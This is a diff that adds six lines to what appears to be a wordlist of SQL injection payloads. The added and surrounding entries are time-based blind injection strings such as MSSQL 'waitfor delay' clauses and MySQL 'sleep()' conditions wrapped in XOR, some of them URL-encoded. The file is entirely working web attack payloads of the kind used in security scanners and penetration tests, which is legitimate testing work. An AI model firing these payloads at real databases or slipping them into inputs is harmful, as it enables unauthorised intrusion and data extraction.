@@ -82,6 +82,12 @@ truncate
 declare @s varchar(200) select @s = 0x77616974 ...
 tz_offset
 sqlvuln
+';%20waitfor%20delay%20'0:0:6'%20--%20
+0"XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR"Z
+0\"XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z
+if(now()=sysdate(),sleep(xx),0)
+1 waitfor delay '0:0:5' --
+0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
 "));waitfor delay '0:0:__TIME__'--
 ||6
 or%201=1 --
